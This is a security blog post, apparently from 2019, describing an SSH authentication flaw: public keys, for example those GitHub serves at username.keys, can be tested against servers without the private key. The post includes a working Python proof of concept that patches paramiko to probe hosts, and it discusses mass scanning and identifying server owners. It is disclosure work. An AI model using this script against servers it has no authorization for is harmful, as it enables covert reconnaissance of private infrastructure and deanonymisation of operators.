<!doctypehtml><html class=h-full lang=en><meta content=D014D736D3108FF229672F5036F3E4E8 name=msvalidate.01><meta charset=utf-8><meta content=IE=edge http-equiv=X-UA-Compatible><meta content=width=device-width,initial-scale=1 name=viewport><title>Public SSH keys can leak your private infrastructure | Artem Golubin </title><link href=/static/css/base.css?v1.0003 rel=stylesheet><meta content="Artem Golubin"name=author><link href=/static/favicon.png rel=icon type=image/png><meta content=uElj_-S0lw8M5XbO231Lm3E1CE_qfnaYDXa8GfjSZI4 name=google-site-verification><meta content="rgb(49, 130, 206)"name=theme-color><link title="RSS Feed for rushter.com"href=https://rushter.com/blog/feed/ rel=alternate type=application/rss+xml><meta content=summary name=twitter:card><meta content=@rushter name=twitter:site><meta content=@rushter name=twitter:creator><meta content=https://rushter.com/blog/public-ssh-keys/ name=twitter:url><meta content="Public SSH keys can leak your private infrastructure"name=twitter:title><meta content="An article about a small security flaw in the SSH authentication protocol that can lead to unexpected information disclosure of private infrastructure."name=twitter:description><meta content=website property=og:type><meta content=https://rushter.com/blog/public-ssh-keys/ property=og:url><meta content=en_US property=og:locale><meta content="Artem Golubin"property=og:site_name><meta content="Public SSH keys can leak your private infrastructure"property=og:title><meta content="An article about a small security flaw in the SSH authentication protocol that can lead to unexpected information disclosure of private infrastructure."property=og:description><meta content="An article about a small security flaw in the SSH authentication protocol that can lead to unexpected information disclosure of private infrastructure."name=description><link href=https://rushter.com/blog/public-ssh-keys/ rel=canonical><script type=application/ld+json>
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "mainEntityOfPage":{
          "@type":"WebPage",
          "@id":"https://rushter.com/blog/public-ssh-keys/"
        },
        "headline": "Public SSH keys can leak your private infrastructure",
        "datePublished": "Nov. 28, 2019, 11:16 a.m.",
        "dateModified": "Nov. 29, 2019, 1:09 a.m.",
        "author": {
          "@type": "Person",
          "name": "Artem Golubin",
          "url": "https://rushter.com/"
        },
        "publisher": {
              "@type": "Organization",
              "name": "Artem Golubin",
              "logo": {
                "@type": "ImageObject",
                "url": "https://rushter.com/static/img/av.png",
                "width": 64,
                "height": 64
              }
        },
        "description": "An article about a small security flaw in the SSH authentication protocol that can lead to unexpected information disclosure of private infrastructure."
    }

    </script><body class="flex flex-col h-full font-sans"><header class="bg-white shadow"><nav class="border-b border-gray-400 bg-white flex items-center justify-center px-auto px-5 md:px-24 nav"><div class="container md:px-10 flex items-center"><a class="py-3 leading-tight text-black font-medium mr-auto"href=/> Artem Golubin </a><a class="px-2 md:px-4 py-3 text-black active"href=/blog/>Blog</a><a class="px-2 md:px-4 py-3 spinning-icon"href=https://twitter.com/rushter rel=noreferrer target=_blank> <i class="icon-twitter w-auto text-sm inline-flex text-black"></i> </a><a class="px-2 md:px-4 py-3 spinning-icon"href=https://github.com/rushter rel=noreferrer target=_blank> <i class="icon-github w-auto text-sm inline-flex text-black"></i> </a><a class="px-2 md:px-4 py-3 spinning-icon"href=https://rushter.com/blog/feed/ rel=noreferrer> <i class="icon-rss w-auto text-sm inline-flex text-black"></i> </a></div></nav></header><div class="flex-1 bg-gray-50"id=main-body><div class="my-8 flex"><div class="bg-white shadow overflow-hidden rounded-md container mx-auto py-8 max-w-4xl"><article id=blog-post><div class="px-4 flex flex-col pb-6"><h1 class="w-full text-2xl leading-none px-2 py-2">Public SSH keys can leak your private infrastructure</h1><div class="px-2 text-slate-600"><i class="icon-calendar text-slate-900 text-sm"></i> Last updated on November 29, 2019, in <a href=/blog/category/security/>security</a></div><div class="border-b my-2"></div></div><div class=px-10 id=article><div class=markdown><p>This article describes a minor security flaw in the SSH authentication protocol that can lead to unexpected private infrastructure disclosure. It also provides a PoC written in Python.<p><a href=https://en.wikipedia.org/wiki/Public-key_cryptography>Asymmetric cryptography</a>, or public-key cryptography, is the most common way to identify and authorize a user on an SSH server. It is also used to encrypt and manage access to different protocols or tools, such as Git, SFTP, SCP, and rsync.<p>Asymmetric cryptography uses a pair of keys: a public key and a private key. A public key can be restored from a private key, but not vice versa. It's a well-known fact that public keys meant to be public and can be widely shared. Unlike public keys, private keys must be not shared and kept in secret by their owners.<p>If you are using SSH keys to authorize on GitHub repositories, it automatically exposes them to everyone. To get public keys of a particular user, you just need to append .keys to the end of a username (e.g., <code>https://github.com/{username}.keys</code>).<div class=codehilite><pre><span></span><code>$ curl https://github.com/ssh_username.keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDS.....4GegDVgkD031qzTXfvsGsXPyFNYK653enI5UTL
</code></pre></div><p>This is a pretty unknown feature of GitHub that allows everyone to gain access to millions of public keys.<p>Update from a reader: As it turned out, GitLab does the same thing.<p>Update from a reader #2: Private on-premise Gitlab CE instances suffer from the same problem. Despite the fact that they are private and you can't list all users on them. It's possible to brute-force some common usernames and get the keys for existing users. Not only such instances serve public keys, but they also allow you to gain extra information about employees of a particular entity.<h2>Authentication Protocol</h2><p>When SSH client sends an auth request to a server, it enumerates all its public keys for which it has private keys. And the interesting detail here is that you don't need a private key to validate if a server allows access from a particular public/private key combination. That is, by having access to a public key, you can check if a server allows access for the specified public key and a username pair.<p>At first glance, it does not look like a big problem. But what if someone wants to target you or your company? An attacker can grab a bunch of public keys from GitHub and run an internet-wide scan of SSH servers on all IPv4 addresses. Some attackers can scan all IPs in a few days and I'm pretty sure government agencies have been using this for years now.<p>If your infrastructure runs on default SSH ports and uses default SSH usernames, such a technique can reveal additional targets for targeted attacks.<p>For most people, that is not a big deal, but for some companies with critical and industrial infrastructure, this can be a problem. Additionally, an attacker can also find some of your consulting clients or customers of your software solutions.<p>It can also be useful in the opposite direction. Suppose you have an IP address of a <a href=https://en.wikipedia.org/wiki/Bulletproof_hosting>bulletproof server</a>, and you want to know who owns it. If a server does not use tools like <code>fail2ban</code>, you can scrape all available keys from Github and slowly enumerate them all against the server. If you are lucky enough, that will give you an identity of an owner.<p>I found a <a href=https://blog.filippo.io/ssh-whoami-filippo-io/>similar proof of concept</a>, that reads all SSH keys of an SSH client when it connects to a special server and checks them against a database of GitHub keys. Instead of a custom SSH server, you can also trick a person to clone a repo on a private Git server.<h2>Technical details</h2><p>SSH authentication works on top of the <a href=https://tools.ietf.org/html/rfc4253>SSH transport</a> protocol that provides session encryption and integrity protection. The <a href=https://tools.ietf.org/html/rfc4252>user authentication</a> happens after a transport session is fully established.<p>To send an auth request with a public key, a client must send a special message over the SSH transport protocol:<div class=codehilite><pre><span></span><code>byte      SSH_MSG_USERAUTH_REQUEST
string    "root"  # user name in ISO-10646 UTF-8 encoding [RFC3629]
string    "ssh-connection" # service name in US-ASCII
string    "publickey" 
boolean   FALSE
string    "ssh-rsa" # public key algorithm name
string    "AAAAB3..yFNYKffe" # public key blob
</code></pre></div><p>As you can see, the above message does not contain any information about the private key. Such requests can only tell if a server <strong>acknowledges</strong> a public key and is ready to check the ownership of a private key. That is actually enough for us to test any public key. When an SSH server does not contain a specific public key in its database (<code>~/.ssh/authorized_keys</code> file), it answers with a rejection message.<p>To perform the actual authentication, a client must sign the request from above with a private key. To do so, it must change the value of the boolean to TRUE and sign all the content of the message:<div class=codehilite><pre><span></span><code>byte      SSH_MSG_USERAUTH_REQUEST
string    "root"  # user name in ISO-10646 UTF-8 encoding [RFC3629]
string    "ssh-connection" # service name in US-ASCII
string    "publickey" 
boolean   TRUE
string    "ssh-rsa" # public key algorithm name
string    "AAAAB3..yFNYKffe" # public key blob
string    "..." # signature of all strings and values from the above signed by a private key
</code></pre></div><p>When a message is signed by a private key, the signature can be verified by a public key. This how a server can finally check that a client owns a private key and give full SSH access. To reduce the amount of network interaction with a server, a lot of the modern SSH clients sign it by default when they can.<p>To validate my understanding and test the auth against my servers, I used <a href=http://www.paramiko.org/>paramiko</a> — the most popular SSH client for Python. Unfortunately, it does not allow a user to test a public key without the private key, so I had to patch it.<p>Here is my script that downloads a public key from Github or loads it from the file system and tests it against the specified server:<div class=codehilite><pre><span></span><code><span class=kn>import</span> <span class=nn>logging</span>
<span class=kn>import</span> <span class=nn>socket</span>
<span class=kn>import</span> <span class=nn>sys</span>

<span class=kn>import</span> <span class=nn>paramiko.auth_handler</span>
<span class=kn>import</span> <span class=nn>requests</span>
<span class=kn>import</span> <span class=nn>argparse</span>


<span class=k>def</span> <span class=nf>valid</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>msg</span><span class=p>):</span>
    <span class=bp>self</span><span class=o>.</span><span class=n>auth_event</span><span class=o>.</span><span class=n>set</span><span class=p>()</span>
    <span class=bp>self</span><span class=o>.</span><span class=n>authenticated</span> <span class=o>=</span> <span class=kc>True</span>
    <span class=nb>print</span><span class=p>(</span><span class=s2>"Valid key"</span><span class=p>)</span>


<span class=k>def</span> <span class=nf>parse_service_accept</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>m</span><span class=p>):</span>
    <span class=c1># https://tools.ietf.org/html/rfc4252#section-7</span>
    <span class=n>service</span> <span class=o>=</span> <span class=n>m</span><span class=o>.</span><span class=n>get_text</span><span class=p>()</span>
    <span class=k>if</span> <span class=ow>not</span> <span class=p>(</span><span class=n>service</span> <span class=o>==</span> <span class=s2>"ssh-userauth"</span> <span class=ow>and</span> <span class=bp>self</span><span class=o>.</span><span class=n>auth_method</span> <span class=o>==</span> <span class=s2>"publickey"</span><span class=p>):</span>
        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>_parse_service_accept</span><span class=p>(</span><span class=n>m</span><span class=p>)</span>
    <span class=n>m</span> <span class=o>=</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>message</span><span class=o>.</span><span class=n>Message</span><span class=p>()</span>
    <span class=n>m</span><span class=o>.</span><span class=n>add_byte</span><span class=p>(</span><span class=n>paramiko</span><span class=o>.</span><span class=n>common</span><span class=o>.</span><span class=n>cMSG_USERAUTH_REQUEST</span><span class=p>)</span>
    <span class=n>m</span><span class=o>.</span><span class=n>add_string</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>username</span><span class=p>)</span>
    <span class=n>m</span><span class=o>.</span><span class=n>add_string</span><span class=p>(</span><span class=s2>"ssh-connection"</span><span class=p>)</span>
    <span class=n>m</span><span class=o>.</span><span class=n>add_string</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>auth_method</span><span class=p>)</span>
    <span class=n>m</span><span class=o>.</span><span class=n>add_boolean</span><span class=p>(</span><span class=kc>False</span><span class=p>)</span>
    <span class=n>m</span><span class=o>.</span><span class=n>add_string</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>private_key</span><span class=o>.</span><span class=n>public_blob</span><span class=o>.</span><span class=n>key_type</span><span class=p>)</span>
    <span class=n>m</span><span class=o>.</span><span class=n>add_string</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>private_key</span><span class=o>.</span><span class=n>public_blob</span><span class=o>.</span><span class=n>key_blob</span><span class=p>)</span>
    <span class=bp>self</span><span class=o>.</span><span class=n>transport</span><span class=o>.</span><span class=n>_send_message</span><span class=p>(</span><span class=n>m</span><span class=p>)</span>


<span class=k>def</span> <span class=nf>patch_paramiko</span><span class=p>():</span>
    <span class=n>table</span> <span class=o>=</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>auth_handler</span><span class=o>.</span><span class=n>AuthHandler</span><span class=o>.</span><span class=n>_client_handler_table</span>

    <span class=c1># In order to avoid using a private key, two callbacks must be patched.</span>
    <span class=c1># The MSG_USERAUTH_INFO_REQUEST (SSH_MSG_USERAUTH_PK_OK 60) indicates a valid public key.</span>
    <span class=n>table</span><span class=p>[</span><span class=n>paramiko</span><span class=o>.</span><span class=n>common</span><span class=o>.</span><span class=n>MSG_USERAUTH_INFO_REQUEST</span><span class=p>]</span> <span class=o>=</span> <span class=n>valid</span>
    <span class=c1># The MSG_SERVICE_ACCEPT event triggers when server sends a request for auth.</span>
    <span class=c1># By default, paramiko signs it with the private key. We don't want that.</span>
    <span class=n>table</span><span class=p>[</span><span class=n>paramiko</span><span class=o>.</span><span class=n>common</span><span class=o>.</span><span class=n>MSG_SERVICE_ACCEPT</span><span class=p>]</span> <span class=o>=</span> <span class=n>parse_service_accept</span>


<span class=k>def</span> <span class=nf>probe_host</span><span class=p>(</span><span class=n>hostname_or_ip</span><span class=p>,</span> <span class=n>port</span><span class=p>,</span> <span class=n>username</span><span class=p>,</span> <span class=n>public_key</span><span class=p>):</span>
    <span class=n>sock</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
    <span class=n>sock</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=n>hostname_or_ip</span><span class=p>,</span> <span class=n>port</span><span class=p>))</span>
    <span class=n>transport</span> <span class=o>=</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>transport</span><span class=o>.</span><span class=n>Transport</span><span class=p>(</span><span class=n>sock</span><span class=p>)</span>
    <span class=n>transport</span><span class=o>.</span><span class=n>start_client</span><span class=p>()</span>

    <span class=c1># For compatibility with paramiko, we need to generate a random private key and replace</span>
    <span class=c1># the public key with our data.</span>
    <span class=n>key</span> <span class=o>=</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>RSAKey</span><span class=o>.</span><span class=n>generate</span><span class=p>(</span><span class=mi>2048</span><span class=p>)</span>
    <span class=n>key</span><span class=o>.</span><span class=n>public_blob</span> <span class=o>=</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>pkey</span><span class=o>.</span><span class=n>PublicBlob</span><span class=o>.</span><span class=n>from_string</span><span class=p>(</span><span class=n>public_key</span><span class=p>)</span>
    <span class=k>try</span><span class=p>:</span>
        <span class=n>transport</span><span class=o>.</span><span class=n>auth_publickey</span><span class=p>(</span><span class=n>username</span><span class=p>,</span> <span class=n>key</span><span class=p>)</span>
    <span class=k>except</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>ssh_exception</span><span class=o>.</span><span class=n>AuthenticationException</span><span class=p>:</span>
        <span class=nb>print</span><span class=p>(</span><span class=s2>"Bad key"</span><span class=p>)</span>


<span class=k>def</span> <span class=nf>get_public_key</span><span class=p>(</span><span class=n>username</span><span class=p>):</span>
    <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>'https://github.com/</span><span class=si>%s</span><span class=s1>.keys'</span> <span class=o>%</span> <span class=n>username</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>r</span><span class=o>.</span><span class=n>content</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>'utf-8'</span><span class=p>)</span>


<span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
    <span class=n>parser</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>()</span>
    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>'host'</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>str</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>'Hostname or IP address'</span><span class=p>)</span>
    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>'--github-username'</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>str</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=kc>None</span><span class=p>)</span>
    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>'--ssh-username'</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>str</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=s2>"root"</span><span class=p>)</span>
    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>'--loglevel'</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=s1>'INFO'</span><span class=p>)</span>
    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>'--port'</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>int</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=mi>22</span><span class=p>)</span>
    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>'--public-key'</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>str</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=kc>None</span><span class=p>)</span>

    <span class=n>args</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>:])</span>
    <span class=n>logging</span><span class=o>.</span><span class=n>basicConfig</span><span class=p>(</span><span class=n>level</span><span class=o>=</span><span class=n>args</span><span class=o>.</span><span class=n>loglevel</span><span class=p>)</span>
    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>github_username</span><span class=p>:</span>
        <span class=n>key</span> <span class=o>=</span> <span class=n>get_public_key</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>github_username</span><span class=p>)</span>
    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>public_key</span><span class=p>:</span>
        <span class=n>key</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>public_key</span><span class=p>,</span> <span class=s1>'rt'</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
    <span class=k>else</span><span class=p>:</span>
        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>"Public key is missing. Please use --github-username or --public-key"</span><span class=p>)</span>

    <span class=n>patch_paramiko</span><span class=p>()</span>
    <span class=n>probe_host</span><span class=p>(</span>
        <span class=n>hostname_or_ip</span><span class=o>=</span><span class=n>args</span><span class=o>.</span><span class=n>host</span><span class=p>,</span>
        <span class=n>port</span><span class=o>=</span><span class=n>args</span><span class=o>.</span><span class=n>port</span><span class=p>,</span>
        <span class=n>username</span><span class=o>=</span><span class=n>args</span><span class=o>.</span><span class=n>ssh_username</span><span class=p>,</span>
        <span class=n>public_key</span><span class=o>=</span><span class=n>key</span>
    <span class=p>)</span>


<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>'__main__'</span><span class=p>:</span>
    <span class=n>main</span><span class=p>()</span>
</code></pre></div><p>The code is also available in <a href=https://github.com/rushter/blog_code/tree/master/ssh>my GitHub repo</a>.<p>To run it, you need to have Python 3, requests and paramiko installed:<div class=codehilite><pre><span></span><code>$ pip3 install paramiko requests
$ python check.py example.org --github-username example --ssh-username root
</code></pre></div><p>As you can see, my script generates a random private key just to keep paramiko happy. The actual auth probing happens with a public key only.<p>Having one SSH key for everything is very convenient, but you probably should not be doing this.<p>Thanks to <a href=https://twitter.com/valdikss target=_blank>ValdikSS</a> for pointing me to this SSH auth detail.</div><div class=py-2 id=related-block><div class="text-black flex items-center"id=related-toggle><h4 class="text-base font-normal py-3 text-blue-500 cursor-pointer"id=toggle-content><i class="icon-arrow-right text-xs text-black related-icon"></i> Popular posts in Security category</h4></div><div class="px-6 related-content"><div class="flex py-2"><div class="md:w-4/12 hidden md:block"><h5 class="text-sm font-bold py-1 text-gray-700">May 04, 2022</h5></div><div class="md:w-8/12 text-left"><a href=/blog/proxy-services/> <h4 class="text-base font-medium">Shady economics of proxy services</h4> </a></div></div></div></div><div class="border-b pt-5"></div><div class="flex justify-between flex-wrap"><div class="pl-3 pt-2 flex flex-wrap items-center"><i class="icon-folder-filled text-sm text-black inline-flex px-1"></i><a href=/blog/category/security/>security</a> ,  <i class="icon-tags text-sm text-black inline-flex px-1"></i><a href=/blog/tags/security/> security </a></div><div class="pr-3 pt-2 flex"><span class="relative py-1 invisible md:visible"> <input class=hidden id=share__checkbox type=checkbox> <label class="px-4 py-1 cursor-pointer mr-5 border rounded border-blue-500 text-blue-600 select-none hover:bg-blue-100"for=share__checkbox><span class="icon-fork text-sm text-blue-600"></span> Share</label> <ul class="border rounded-lg w-56 bg-white z-50"id=share__menu><a rel="nofollow noreferrer"class=text-black href=https://www.linkedin.com/shareArticle?mini=true&url=https://rushter.com/blog/public-ssh-keys/&title=Public%20SSH%20keys%20can%20leak%20your%20private%20infrastructure target=_blank> <li class="flex justify-between py-2 pl-3 border-b text-sm hover:bg-gray-500">Linkedin <i class="icon-lkin text-sm text-black pr-4"></i></li> </a><a rel="nofollow noreferrer"class=text-black href=https://telegram.me/share/url?text=Public%20SSH%20keys%20can%20leak%20your%20private%20infrastructure&url=https://rushter.com/blog/public-ssh-keys/ target=_blank> <li class="flex justify-between py-2 pl-3 border-b text-sm hover:bg-blue-400">Telegram <i class="icon-telegram text-sm text-black pr-4"></i></li> </a><a rel="nofollow noreferrer"class=text-black href=http://vk.com/share.php?title=Public%20SSH%20keys%20can%20leak%20your%20private%20infrastructure&url=https://rushter.com/blog/public-ssh-keys/ target=_blank> <li class="flex justify-between py-2 pl-3 border-b text-sm hover:bg-blue-400">VK <i class="icon-vk text-sm text-black pr-4"></i></li> </a><a rel="nofollow noreferrer"class=text-black href=https://reddit.com/submit/?url=https://rushter.com/blog/public-ssh-keys/ target=_blank> <li class="flex justify-between py-2 pl-3 border-b text-sm hover:bg-red-700">Reddit <i class="icon-reddit text-sm text-black pr-4"></i></li> </a><a rel="nofollow noreferrer"class=text-black href=https://news.ycombinator.com/submitlink?u=https://rushter.com/blog/public-ssh-keys/&t=Public%20SSH%20keys%20can%20leak%20your%20private%20infrastructure target=_blank> <li class="flex justify-between py-2 pl-3 border-b text-sm hover:bg-orange-500">Hacker News <i class="icon-hn text-sm text-black pr-4"></i></li> </a><a rel="nofollow noreferrer"class=text-black href=https://twitter.com/intent/tweet?url=https://rushter.com/blog/public-ssh-keys/&text=Public%20SSH%20keys%20can%20leak%20your%20private%20infrastructure&via=rushter target=_blank> <li class="flex justify-between py-2 pl-3 border-b text-sm hover:bg-blue-500">Twitter <i class="icon-twitter text-sm text-black pr-4"></i></li> </a></ul> </span><div class=md:hidden><a rel="nofollow noreferrer"class=text-black href=https://twitter.com/intent/tweet?url=https://rushter.com/blog/public-ssh-keys/&text=Public%20SSH%20keys%20can%20leak%20your%20private%20infrastructure&via=rushter target=_blank> <li class="flex justify-between px-1 py-1 rounded-full"><i class="icon-twitter text-base text-blue-500 pr-4"></i></li> </a></div><a href=https://rushter.com/blog/feed/ target=_blank> <button class="px-2 py-1 cursor-pointer border rounded border-blue-500 text-blue-600 select-none hover:bg-blue-100">RSS <i class="icon-rss text-sm"></i></button> </a></div></div><div class="container flex flex-wrap flex-row break-words"id=post-comments><h1 class="justify-center text-lg">Comments</h1><div class="w-full text-black py-1 pb-6"><div><ul class="pt-5 border-gray-300"><li class=my-4><div class="text-left pl-2"id=comment-47><div class="post-comment-right markdown"><span> <span class="text-base font-medium pr-2">rjc</span> 3 years, 9 months ago (from disqus) <a href=?#comment-47>#</a> </span><p class=pt-1 style=white-space:pre-wrap><blockquote><p>This is a pretty unknown feature of GitHub that allows everyone to gain access to millions of public keys.</blockquote><p>Old news, i.e. <a href=https://changelog.com/posts/github-exposes-public-ssh-keys-for-its-users>https://changelog.com/posts/github-exposes-public-ssh-keys-for-its-users</a><p>There's even an API for it <a href=https://developer.github.com/v3/users/keys/#list-public-keys-for-a-user>https://developer.github.com/v3/users/keys/#list-public-keys-for-a-user</a><p><a class=reply-to data-id=47>reply</a><div class="reply-form p-0 m-0"></div></div></div> <div class=chld><div><ul class="border-l-2 ml-6 pl-1 border-gray-300"><li class=my-4><div class="text-left pl-2"id=comment-48><div class="post-comment-right markdown"><span> <span class="text-base font-medium pr-2 text-green-500">Artem</span> 3 years, 9 months ago (from disqus) <a href=?#comment-48>#</a> </span><p class=pt-1 style=white-space:pre-wrap><p>That's definitely old news, but how does that prove that my statement is wrong? I think 90% of developers are not aware of that.<p><a class=reply-to data-id=48>reply</a><div class="reply-form p-0 m-0"></div></div></div></ul></div></div></ul></div><div><ul class="pt-5 border-gray-300"><li class=my-4><div class="text-left pl-2"id=comment-49><div class="post-comment-right markdown"><span> <span class="text-base font-medium pr-2">mihai</span> 3 years, 8 months ago (from disqus) <a href=?#comment-49>#</a> </span><p class=pt-1 style=white-space:pre-wrap><p>I think this is more of a vulnerability in the way SSH Protocol that checks if you own a private key. I always assumed it encrypts a challenge with the public keys and if the client can decrypt it, it must have it. Is there a CVE for this? I see it as an enumeration vulnerability.<p>EDIT: Thinking about it, I see this as a PoC, and soon enough somebody will create a Metasploit module for it :)<p><a class=reply-to data-id=49>reply</a><div class="reply-form p-0 m-0"></div></div></div></ul></div><div><ul class="pt-5 border-gray-300"><li class=my-4><div class="text-left pl-2"id=comment-84><div class="post-comment-right markdown"><span> <span class="text-base font-medium pr-2">ivan</span> 3 years, 5 months ago <a href=?#comment-84>#</a> </span><p class=pt-1 style=white-space:pre-wrap><p>Create a different public key specifically for github and gitlab. Problem is gone.<p><a class=reply-to data-id=84>reply</a><div class="reply-form p-0 m-0"></div></div></div></ul></div><div><ul class="pt-5 border-gray-300"><li class=my-4><div class="text-left pl-2"id=comment-151><div class="post-comment-right markdown"><span> <span class="text-base font-medium pr-2">Peter</span> 1 year, 11 months ago <a href=?#comment-151>#</a> </span><p class=pt-1 style=white-space:pre-wrap><p>Your blog post is mentioned in CVE-2016-20012: https://nvd.nist.gov/vuln/detail/CVE-2016-20012<p>Good work!!!<p>And a pull request is on Github https://github.com/openssh/openssh-portable/pull/270 which closes this vulnerability. But it seems, that the openssh devs does not merge the fix :-/<p>Note: In the pull request, there is an audit tool mentioned. This is the audit tool, which is able to do the man in the middle attack: https://github.com/ssh-mitm/ssh-mitm<p><a class=reply-to data-id=151>reply</a><div class="reply-form p-0 m-0"></div></div></div></ul></div></div><div class=w-full id=c-form><form class="w-full max-w-lg pt-5 border-1 p-4 comment-form"><div class="flex flex-wrap -mx-3 mb-6"><div class="w-full px-3"><label class="block uppercase tracking-wide text-gray-700 text-xs font-bold mb-2">Name</label><input class="appearance-none block bg-gray-100 text-gray-700 border border-gray-200 rounded py-1 px-2 mb-1 leading-tight focus:outline-none focus:bg-white focus:border-gray-500"name=username></div></div><div class="flex flex-wrap -mx-3 mb-2"><div class="w-full px-3"><label class="block uppercase tracking-wide text-gray-700 text-xs font-bold mb-2"for=grid-password>Message</label><textarea class="appearance-none block w-full bg-gray-100 text-gray-700 border border-gray-200 rounded py-3 px-4 mb-3 leading-tight focus:outline-none focus:bg-white focus:border-gray-500"placeholder="Plain text or markdown"name=message rows=3></textarea></div></div><div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative max-w-lg my-4 err-alert"role=alert style=display:none></div><div class="bg-blue-100 border border-b border-blue-500 text-blue-700 px-4 py-3 rounded relative max-w-lg my-4 info-alert"role=alert style=display:none></div><div class="md:flex md:items-center"><div class=md:w-1/3><button class="shadow bg-blue-600 hover:bg-blue-700 focus:ring focus:outline-none text-sm text-white font-semibold py-1 px-2 rounded c-submit">Send</button></div><div class=md:w-2/3></div></div><input class=cchh name=cchh type=hidden value=942df16302946d16f505bdf3307a9dd95904dd8190b7d7f3acb442401ea155a379RimavIRBqOgZKrEpCz1liJOSOcgpQgk9wgihpjFtZVzgUUhFalguX02dxPTelv><input class=rto name=rto type=hidden><input class=pid name=pid type=hidden value=25></form></div></div></div></article></div></div></div><footer><div class=bg-white><div class="max-w-screen-xl mx-auto py-6 px-4 sm:px-6 md:flex md:items-center md:justify-between lg:px-8"><div class="text-center mt-8 md:mt-0 md:order-1"><a class=text-gray-600 href=#main-body>Back to top</a></div><div class="flex justify-center md:order-2"><a class="px-2 md:px-2 py-3"href=https://twitter.com/rushter rel=noreferrer target=_blank> <i class="icon-twitter w-auto text-lg text-gray-500 hover:text-gray-600 inline-flex"></i> </a><a class="px-2 md:px-2 py-3"href=https://github.com/rushter rel=noreferrer target=_blank> <i class="icon-github w-auto text-lg inline-flex text-gray-500 hover:text-gray-600"></i> </a><a class="px-2 md:px-2 py-3"href=https://rushter.com/blog/feed/ rel=noreferrer> <i class="icon-rss w-auto text-lg inline-flex text-gray-500 hover:text-gray-600"></i> </a></div><div class="mt-8 md:mt-0 md:order-3"><p class="text-center text-sm leading-6 text-gray-600">© 2009-2023, Artem Golubin, <a class=text-gray-700 href=mailto:me@rushter.com> me@rushter.com </a></div></div></div></footer><script data-cf-beacon='{"token": "a2eaa862bf674fc7a36cabb3dd24abd6"}'defer src=https://static.cloudflareinsights.com/beacon.min.js></script><script src=/static/js/main.min.js></script><script>initBlogPage('25')</script>